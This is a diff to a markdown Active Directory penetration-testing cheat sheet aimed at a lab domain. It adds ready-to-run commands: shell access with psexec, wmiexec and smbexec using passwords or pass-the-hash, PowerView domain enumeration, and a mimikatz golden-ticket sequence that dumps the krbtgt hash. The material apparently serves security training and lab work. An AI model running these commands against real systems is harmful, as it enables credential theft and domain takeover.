@@ -21,12 +21,16 @@ Let's assume that the Domain Controller IP is `10.10.10.1/24` and we managed to 
 10. [Password/Hash Spraying](#passwordhash-spraying)
 11. [SMB Enumeration](#smb-enumeration)
 12. [Pass the Password/Pass the Hash](#pass-the-password-pass-the-hash)
-13. [Local Privilege Escalation](#local-privilege-escalation)
-14. [Credential Dumping](#credential-dumping)
-15. [Lateral Movement](#lateral-movement)
-16. [Alternative Access to Compromised Machine using RDP](#alternative-access-to-compromised-machine-using-rdp)
-17. [Domain Privilege Escalation](#domain-privilege-escalation)
-18. [Final Notes](#final-notes)
+13. [Shell Access](#shell-access)
+14. [Local Privilege Escalation](#local-privilege-escalation)
+15. [Credential Dumping](#credential-dumping)
+16. [Rubeus Kerberos Attacks](#rubeus-kerberos-attacks)
+17. [Alternative Access to Compromised Machine using RDP](#alternative-access-to-compromised-machine-using-rdp)
+18. [Lateral Movement](#lateral-movement)
+19. [Domain Privilege Escalation](#domain-privilege-escalation)
+20. [Post-Pwning Domain Controller](#post-pwning-domain-controller)
+21. [References](#references)
+22. [Final Notes](#final-notes)
 
 ---
 
@@ -41,7 +45,7 @@ netdiscover -r 10.10.10.0/24
 nmap -T4 -p- -sC -sV 10.10.10.0/24
 ```
 
-### 3. If we found a port serving a website and is redirecting we to a domain we can use the following command to add the domain
+### 3. If we found a port serving a website and is redirecting us to a domain we can use the following command to add the domain
 ```sh
 sudo nano /etc/hosts
 
@@ -52,10 +56,10 @@ sudo nano /etc/hosts
 ### 4. If we found a HTTP port serving a website we can use the following commands to enumerate
 ```sh
 #Enumerate directories
-gobuster dir -u http://something.local -w /SecLists/Discovery/Web-Content/raft-small-directories.txt
+gobuster dir -u http://test.local -w /SecLists/Discovery/Web-Content/raft-small-directories.txt
 
 #Enumerate subdomains
-gobuster vhost -k -u http://something.local -w /SecLists/Discovery/DNS/subdomains-top1million.txt
+gobuster vhost -k -u http://test.local -w /SecLists/Discovery/DNS/subdomains-top1million.txt
 ```
 
 ---
@@ -297,6 +301,38 @@ run
 
 ---
 
+## Shell Access
+
+After obtaining valid domain user credentials we can try gaining shell access, note that not every user account could grant us a shell on the machine.
+
+### PSExec
+```sh
+# for domain users
+psexec.py test.local/fcastle:'Password1'@10.10.10.1
+
+# for local users
+psexec.py fcastle:'Password1'@10.10.10.1
+
+# authenticating with local user and password hash
+psexec.py Administrator@10.10.10.1 --hashes [LM-hash]:[NTLM-hash]
+```
+
+### Wmiexec
+```sh
+# authenticating with local user and password hash
+wmiexec.py Administrator@10.10.10.1 --hashes [LM-hash]:[NTLM-hash]
+```
+
+### SMBExec
+```sh
+# authenticating with local user and password hash
+smbexec.py test.local/fcastle:'Password1'@10.10.10.1
+```
+
+
+
+---
+
 ## Local Privilege Escalation
 
 ### After getting a meterpreter shell, try the following command to see who we are in the machine
@@ -341,6 +377,10 @@ Load PowerView and use it to gather information about the system and domain.
 ```sh
 powershell -ep bypass -File .\PowerView.ps1
 Get-NetLocalGroupMember -Group "Administrators"
+Get-NetUser # Lists domain users.
+Get-NetGroupMember # Lists group members.
+Find-LocalAdminAccess # Finds where a user has admin access.
+Invoke-ShareFinder # Locates shared network resources.
 ```
 
 ---
@@ -534,6 +574,28 @@ impacket-psexec test.local/Administrator@10.10.10.2 -k -no-pass
 
 ---
 
+## Post-Pwning Domain Controller
+We can try doing a golden ticket attack to get more access to the whole domain by using mimikatz on the domain controller
+```ps1
+mimikatz.exe
+
+privilege::debug
+
+# dump the krbtgt user hash
+lsadump::lsa /inject /name:krbtgt
+
+kerberos::golden /User:Administrator /domain:test.local /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_NTLM_HASH] /id:500 /ptt
+
+# next we want the golden ticket cmd
+misc::cmd
+
+# now check our privileges, with accessing another machine
+dir \\machine-01\c$
+```
+
+
+
+---
 ## References
 https://www.offsec.com/metasploit-unleashed/fun-incognito/
 https://github.com/GhostPack/Rubeus
